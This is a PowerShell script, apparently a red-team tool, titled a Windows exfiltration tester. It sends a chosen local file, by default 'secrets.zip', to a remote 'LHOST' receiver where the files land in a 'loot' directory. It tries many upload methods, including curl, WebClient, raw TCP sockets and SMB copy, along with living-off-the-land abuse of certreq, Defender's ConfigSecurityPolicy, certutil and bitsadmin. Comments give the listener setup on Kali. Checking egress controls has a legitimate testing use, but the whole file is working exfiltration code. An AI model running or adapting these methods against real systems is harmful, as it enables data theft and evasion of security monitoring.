#Requires -Version 5.1
<#
.SYNOPSIS
    Windows exfiltration tester.

.DESCRIPTION
    Sends one local file to a receiver on LHOST using different Windows methods.

    Default: stops at the first successful upload and prints the working method.
    -All: runs every method, writes a detailed log and CSV, and compares the
    source hash.

    The receiver should be started in the directory where you want the loot:
    uploadserver, serv.py, nginx PUT, nc/socat, or an SMB/WebDAV share.

.PARAMETER LHOST
    Receiver IP or hostname.

.PARAMETER LPORT
    Receiver TCP port for HTTP/HTTPS methods (default: 8000).

.PARAMETER File
    Full local path to the file to exfiltrate
    (default: C:\Users\Public\secrets.zip).

.PARAMETER UNCPath
    Optional SMB/WebDAV destination directory for copy/robocopy, for example
    \\10.0.2.10\share\. Authenticate with net use first.

.PARAMETER RawPort
    Optional TCP port for the raw-TCP test (nc/socat receiver). 0 = skip.

.PARAMETER TimeoutSec
    Timeout for HTTP-based methods, in seconds (default: 20).

.PARAMETER Log
    Write a log/CSV in quick mode. The default quick mode is console-only.

.PARAMETER NoLogs
    Quiet quick mode: print only Done! on success, no log/CSV.
    With -All the full matrix still runs, but no log/CSV files are written
    (the receiver still saves the uploaded files).

.PARAMETER LOLBINS
    Run only LOLBin-tagged methods (certreq, ConfigSecurityPolicy,
    certutil-curl, bitsadmin).

.PARAMETER Receiver
    Receiver profile for the matrix: All (default), UploadServer, ServPy,
    Nginx, Bits, RawTcp, Smb. Use it with -All to test only the methods that
    match the receiver you actually started.

.PARAMETER All
    Run every method, write a detailed log and CSV. Alias: -Full.
    PowerShell reserves -Debug as a common parameter, so this is -All.

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -NoLogs

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -FILE C:\Users\Public\secrets.zip -All

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -ALL -Receiver rawtcp -RawPort 4444

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -All -Receiver uploadserver

.EXAMPLE
    .\Windows-Exfil-tester.ps1 -LHOST 10.0.2.10 -LPORT 8000 -UNCPath '\\10.0.2.10\share\' -All -Receiver smb

.NOTES
    Authorized testing only. The receiver saves the file in its working directory.
#>
# ===== RECEIVER SETUP (Kali) =====
# uploadserver : mkdir -p /tmp/loot && cd /tmp/loot && uploadserver 8000
# serv.py      : cd /tmp/loot && python3 /path/to/scripts/upload/serv.py
# nginx PUT    : root /tmp/loot; location /SecretUploadDirectory/ { dav_methods PUT; }
# rawtcp       : nc -lvnp 4444 > /tmp/loot/secrets.zip
# smb          : sudo impacket-smbserver share /tmp/loot -smb2support -username test -password test
# bits         : BITS-compatible server (IIS BITS/BITSServer)
# webdav       : rclone serve webdav /tmp/loot --addr :8000 --user test --pass test
# profiles     : -Receiver uploadserver | servpy | nginx | rawtcp | smb | bits
# =================================
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string]$LHOST,

    [ValidateRange(1, 65535)]
    [int]$LPORT = 8000,

    [string]$File = 'C:\Users\Public\secrets.zip',

    [string]$UNCPath = '',

    [ValidateRange(0, 65535)]
    [int]$RawPort = 0,

    [ValidateRange(1, 600)]
    [int]$TimeoutSec = 20,

    [switch]$Log,

    [switch]$NoLogs,

    [switch]$LOLBINS,

    [ValidateSet('All', 'UploadServer', 'ServPy', 'Nginx', 'Bits', 'RawTcp', 'Smb')]
    [string]$Receiver = 'All',

    [Alias('Full')]
    [switch]$All
)

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

$Source    = [IO.Path]::GetFullPath($File)
$FileName  = Split-Path -Leaf $Source
$SourceDir = Split-Path -Parent $Source
$Base      = "http://${LHOST}:${LPORT}"
$Stamp     = Get-Date -Format 'yyyyMMdd-HHmmss'
$LogPath   = Join-Path $SourceDir "Windows-exfil-test-$Stamp.log"
$CsvPath   = Join-Path $SourceDir "Windows-exfil-test-$Stamp.csv"
$Results   = New-Object System.Collections.ArrayList

$WriteLog = ($All -or $Log) -and (-not $NoLogs)
$Quiet    = $NoLogs -and (-not $All)

if (-not (Test-Path -LiteralPath $Source)) {
    Write-Host "Source file not found: $Source" -ForegroundColor Red
    exit 1
}

$SourceItem = Get-Item -LiteralPath $Source
$SourceHash = (Get-FileHash -Path $Source -Algorithm SHA256).Hash

function Write-TestLog {
    param(
        [string]$Message,
        [switch]$NoConsole
    )

    $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Message
    if (-not $NoConsole) { Write-Host $line }
    if ($WriteLog) { Add-Content -LiteralPath $LogPath -Value $line -Encoding UTF8 }
}

function New-TestResult {
    param(
        [string]$Method,
        [string]$Receiver,
        [string]$Status,
        [double]$Seconds,
        [string]$Error
    )

    [pscustomobject]@{
        Method   = $Method
        Receiver = $Receiver
        Status   = $Status
        Seconds  = [math]::Round($Seconds, 2)
        Error    = $Error
    }
}

function Invoke-UploadMethod {
    param(
        [string]$Name,
        [scriptblock]$Action
    )

    $sw  = [System.Diagnostics.Stopwatch]::StartNew()
    $err = $null
    try {
        & $Action
    } catch {
        $err = $_.Exception.Message
    }
    $sw.Stop()

    $result = if ($err) {
        New-TestResult -Method $Name -Receiver $ReceiverMap[$Name] -Status 'FAIL' -Seconds $sw.Elapsed.TotalSeconds -Error ($err -replace '\s+', ' ')
    } else {
        New-TestResult -Method $Name -Receiver $ReceiverMap[$Name] -Status 'OK' -Seconds $sw.Elapsed.TotalSeconds -Error ''
    }

    $color = if ($result.Status -eq 'OK') { 'Green' } else { 'Red' }
    if (-not $Quiet) {
        Write-Host ('[{0}] {1,-20} [{2,-12}] {3,7:N2}s  {4}' -f $result.Status, $result.Method, $result.Receiver, $result.Seconds, $result.Error) -ForegroundColor $color
    }
    if ($WriteLog) {
        Add-Content -LiteralPath $LogPath -Value ('[{0}] {1,-20} {2,7:N2}s  {3}' -f $result.Status, $result.Method, $result.Seconds, $result.Error) -Encoding UTF8
    }

    [void]$Results.Add($result)
    return $result
}

# ConfigSecurityPolicy is inside the Defender folders, not always on PATH
$ConfigSecurityPolicy = $null
if ($env:ProgramData) {
    $defenderPlatform = Join-Path $env:ProgramData 'Microsoft\Windows Defender\Platform'
    if (Test-Path -LiteralPath $defenderPlatform) {
        $ConfigSecurityPolicy = Get-ChildItem -LiteralPath $defenderPlatform -Filter 'ConfigSecurityPolicy.exe' -Recurse -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $ConfigSecurityPolicy) {
        $candidates = @()
        if ($env:ProgramFiles) { $candidates += (Join-Path $env:ProgramFiles 'Windows Defender\ConfigSecurityPolicy.exe') }
        $pf86 = ${env:ProgramFiles(x86)}
        if ($pf86) { $candidates += (Join-Path $pf86 'Windows Defender\ConfigSecurityPolicy.exe') }
        foreach ($candidate in $candidates) {
            if (Test-Path -LiteralPath $candidate) { $ConfigSecurityPolicy = $candidate; break }
        }
    }
}

$SafeName = $FileName -replace '"', ''
$UrlName  = [Uri]::EscapeDataString($FileName)
$UrlFile  = "$Base/upload?file=$UrlName"
$PutUrl   = "$Base/SecretUploadDirectory/$UrlName"
$UncDir   = if ($UNCPath) { $UNCPath.TrimEnd('\') } else { '' }

$ReceiverMap = @{
    'curl-form'            = 'UploadServer'
    'ps-form'              = 'UploadServer'
    'ps-raw'               = 'ServPy'
    'webclient-upload'     = 'ServPy'
    'ps-put'               = 'Nginx'
    'curl-put'             = 'Nginx'
    'webclient-put'        = 'Nginx'
    'certreq'              = 'ServPy'
    'configsecuritypolicy' = 'ServPy'
    'certutil-curl'        = 'ServPy'
    'bitsadmin'            = 'Bits'
    'raw-tcp'              = 'RawTcp'
    'unc-copy'             = 'Smb'
    'robocopy'             = 'Smb'
}

$Methods = @(
    [pscustomobject]@{
        Name      = 'curl-form'
        Tag       = 'Standard'
        Available = { [bool](Get-Command curl.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $output = & curl.exe -sS -f -X POST -F "files=@$Source" "$Base/upload" 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'ps-form'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            $b = [Guid]::NewGuid().ToString()
            $fileBytes = [IO.File]::ReadAllBytes($Source)
            $h = [Text.Encoding]::UTF8.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"$SafeName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
            $t = [Text.Encoding]::UTF8.GetBytes("`r`n--$b--`r`n")
            $m = New-Object IO.MemoryStream
            $m.Write($h, 0, $h.Length)
            $m.Write($fileBytes, 0, $fileBytes.Length)
            $m.Write($t, 0, $t.Length)
            Invoke-RestMethod -Uri "$Base/upload" -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $m.ToArray() -TimeoutSec $TimeoutSec -ErrorAction Stop | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'ps-raw'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            Invoke-RestMethod -Uri $UrlFile -Method Post -InFile $Source -ContentType 'application/octet-stream' -TimeoutSec $TimeoutSec -ErrorAction Stop | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'webclient-upload'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            (New-Object Net.WebClient).UploadFile("$Base/upload", $Source)
        }
    },
    [pscustomobject]@{
        Name      = 'ps-put'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            Invoke-RestMethod -Uri $PutUrl -Method Put -InFile $Source -TimeoutSec $TimeoutSec -ErrorAction Stop | Out-Null
        }
    },
    [pscustomobject]@{
        Name      = 'curl-put'
        Tag       = 'Standard'
        Available = { [bool](Get-Command curl.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $output = & curl.exe -sS -f -T $Source $PutUrl 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'webclient-put'
        Tag       = 'Standard'
        Available = { $true }
        Run       = {
            (New-Object Net.WebClient).UploadFile($PutUrl, 'PUT', $Source)
        }
    },
    [pscustomobject]@{
        Name      = 'certreq'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command certreq.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $output = & certreq.exe -Post -config $UrlFile $Source 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'configsecuritypolicy'
        Tag       = 'LOLBIN'
        Available = { [bool]$ConfigSecurityPolicy }
        Run       = {
            $output = & $ConfigSecurityPolicy $Source $UrlFile 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
        }
    },
    [pscustomobject]@{
        Name      = 'certutil-curl'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command certutil.exe -ErrorAction SilentlyContinue) -and [bool](Get-Command curl.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $tmp = Join-Path $env:TEMP "exfil-$Stamp.b64"
            try {
                $enc = & certutil.exe -encode $Source $tmp 2>&1 | Out-String
                if ($LASTEXITCODE -ne 0) { throw ($enc.Trim()) }
                $output = & curl.exe -sS -f --data-binary "@$tmp" "$Base/upload?file=$UrlName.b64" 2>&1 | Out-String
                if ($LASTEXITCODE -ne 0) { throw ($output.Trim()) }
            } finally {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            }
        }
    },
    [pscustomobject]@{
        Name      = 'bitsadmin'
        Tag       = 'LOLBIN'
        Available = { [bool](Get-Command bitsadmin.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $job = "exfil-$Stamp"
            $output = & bitsadmin.exe /transfer $job /upload "$Base/upload" $Source 2>&1 | Out-String
            if ($LASTEXITCODE -ne 0 -or $output -match '(?i)0x[0-9a-f]{8}') {
                & bitsadmin.exe /cancel $job 2>&1 | Out-Null
                throw ($output.Trim())
            }
        }
    },
    [pscustomobject]@{
        Name      = 'raw-tcp'
        Tag       = 'Standard'
        Available = { $RawPort -gt 0 }
        Run       = {
            $client = New-Object Net.Sockets.TcpClient
            try {
                $client.Connect($LHOST, $RawPort)
                $stream = $client.GetStream()
                try {
                    $bytes = [IO.File]::ReadAllBytes($Source)
                    $stream.Write($bytes, 0, $bytes.Length)
                    $stream.Flush()
                } finally { $stream.Close() }
            } finally { $client.Close() }
        }
    },
    [pscustomobject]@{
        Name      = 'unc-copy'
        Tag       = 'Standard'
        Available = { [bool]$UncDir }
        Run       = {
            $dest = Join-Path $UncDir $FileName
            Copy-Item -LiteralPath $Source -Destination $dest -Force -ErrorAction Stop
        }
    },
    [pscustomobject]@{
        Name      = 'robocopy'
        Tag       = 'Standard'
        Available = { [bool]$UncDir -and [bool](Get-Command robocopy.exe -ErrorAction SilentlyContinue) }
        Run       = {
            $output = & robocopy.exe (Split-Path -Parent $Source) $UncDir $FileName /R:1 /W:1 2>&1 | Out-String
            if ($LASTEXITCODE -ge 8) { throw ($output.Trim()) }
        }
    }
)

if ($All) {
    Write-TestLog '============================================'
    Write-TestLog ' Windows exfil test'
    Write-TestLog '============================================'
    Write-TestLog "Time:        $(Get-Date -Format o)"
    Write-TestLog "Computer:    $env:COMPUTERNAME"
    Write-TestLog "User:        $env:USERNAME"
    Write-TestLog "PowerShell:  $($PSVersionTable.PSVersion)"
    try {
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
        Write-TestLog "OS:          $($os.Caption) $($os.Version)"
    } catch {
        Write-TestLog "OS:          $([Environment]::OSVersion.VersionString)"
    }
    Write-TestLog "Source:      $Source"
    Write-TestLog "Bytes:       $($SourceItem.Length)"
    Write-TestLog "SHA256:      $SourceHash"
    Write-TestLog "Receiver:    $Base"
    Write-TestLog "Profile:     $Receiver"
    Write-TestLog "UNC:         $(if ($UncDir) { $UncDir } else { 'not set' })"
    Write-TestLog "RawPort:     $(if ($RawPort -gt 0) { $RawPort } else { 'disabled' })"
    Write-TestLog 'Receiver hint: start uploadserver/serv.py/nginx in the Kali loot directory; files land in its cwd.'
    Write-TestLog ''
}
else {
    if (-not $Quiet) {
        Write-Host "Exfil: $Source -> $Base" -ForegroundColor Cyan
        Write-Host 'Stop at first success. Use -Log for a log or -All for the full matrix.' -ForegroundColor DarkGray
        Write-Host ''
    }
    if ($WriteLog) {
        Write-TestLog 'Windows exfil test' -NoConsole
        Write-TestLog "Time:        $(Get-Date -Format o)" -NoConsole
        Write-TestLog "Source:      $Source" -NoConsole
        Write-TestLog "SHA256:      $SourceHash" -NoConsole
        Write-TestLog "Receiver:    $Base" -NoConsole
        Write-TestLog '' -NoConsole
    }
}

$AllowedTags = if ($LOLBINS) { @('LOLBIN') } else { @('Standard', 'LOLBIN') }

$firstSuccess = $null
foreach ($method in $Methods) {
    if ($method.Tag -notin $AllowedTags) { continue }
    if ($Receiver -ne 'All' -and $ReceiverMap[$method.Name] -ne $Receiver) { continue }

    if (-not (& $method.Available)) {
        $skip = New-TestResult -Method $method.Name -Receiver $ReceiverMap[$method.Name] -Status 'SKIP' -Seconds 0 -Error 'not available'
        [void]$Results.Add($skip)
        if (-not $Quiet) { Write-Host ('[SKIP] {0} [{1}]' -f $method.Name, $ReceiverMap[$method.Name]) -ForegroundColor Yellow }
        if ($WriteLog) { Add-Content -LiteralPath $LogPath -Value ('[SKIP] {0}' -f $method.Name) -Encoding UTF8 }
        continue
    }

    $result = Invoke-UploadMethod -Name $method.Name -Action $method.Run
    if ($result.Status -eq 'OK') {
        if (-not $firstSuccess) { $firstSuccess = $result }
        if (-not $All) { break }
    }
}

if ($All) {
    Write-TestLog ''
    Write-TestLog '============================================'
    Write-TestLog ' Summary'
    Write-TestLog '============================================'
    $summary = $Results | Format-Table -AutoSize | Out-String -Width 300
    Write-Host $summary
    if ($WriteLog) {
        Add-Content -LiteralPath $LogPath -Value $summary -Encoding UTF8
        $Results | Export-Csv -Path $CsvPath -NoTypeInformation -Encoding UTF8
    }
    $okCount = @($Results | Where-Object { $_.Status -eq 'OK' }).Count
    Write-TestLog "Successful methods: $okCount / $($Results.Count)"
    if ($WriteLog) {
        Write-TestLog "Log saved: $LogPath"
        Write-TestLog "CSV saved: $CsvPath"
    }
    if ($okCount -eq 0) { exit 1 }
}
else {
    if ($firstSuccess) {
        $finalLine = '[OK] {0} [{1}] ({2:N2}s); source SHA256 {3}' -f $firstSuccess.Method, $firstSuccess.Receiver, $firstSuccess.Seconds, $SourceHash
        if ($Quiet) {
            Write-Host 'Done!' -ForegroundColor Green
        } else {
            Write-Host ''
            Write-Host $finalLine -ForegroundColor Green
            Write-Host '     Use -Log for a log or -All for the full matrix.' -ForegroundColor DarkGray
        }
        if ($WriteLog) {
            Write-TestLog $finalLine -NoConsole
            Write-Host "Log: $LogPath" -ForegroundColor DarkGray
            Write-Host "CSV: $CsvPath" -ForegroundColor DarkGray
            $Results | Export-Csv -Path $CsvPath -NoTypeInformation -Encoding UTF8
        }
        exit 0
    }

    if ($Quiet) {
        Write-Host 'Failed.' -ForegroundColor Red
    } else {
        Write-Host ''
        Write-Host 'No exfil method succeeded.' -ForegroundColor Red
        $Results | Where-Object { $_.Status -ne 'OK' } | Format-Table -AutoSize | Out-String -Width 300 | Write-Host
    }
    if ($WriteLog) {
        $Results | Export-Csv -Path $CsvPath -NoTypeInformation -Encoding UTF8
        Write-Host "Log: $LogPath" -ForegroundColor DarkGray
        Write-Host "CSV: $CsvPath" -ForegroundColor DarkGray
    }
    exit 1
}
